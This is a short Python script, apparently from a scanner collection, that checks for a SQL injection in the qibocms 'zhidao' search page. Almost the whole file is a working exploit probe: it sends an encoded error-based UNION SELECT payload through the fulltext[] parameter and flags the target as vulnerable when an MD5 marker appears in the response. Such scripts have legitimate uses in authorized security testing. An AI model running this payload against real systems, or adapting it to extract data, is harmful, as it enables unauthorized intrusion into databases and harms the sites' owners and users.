#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: qibocms知道系统SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0115138
author: Lucifer
description: 文件/zhidao/zhidao/search.php中,参数fulltext存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class qibocms_search_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/zhidao/zhidao/search.php?&tags=ll%20ll%20ll&keyword=111&fulltext[]=11)%20AnD%201=2%20UnIoN%20SeLeCt%201%20FrOm%20(SeLeCt%20CoUnT(*),CoNcAt(FlOoR(RaNd(0)*2),Md5(1234))a%20FrOm%20InFoRmAtIoN_ScHeMa.TaBlEs%20GrOuP%20By%20a)b%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在qibocms知道系统注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = qibocms_search_sqli_BaseVerify(sys.argv[1])
    testVuln.run()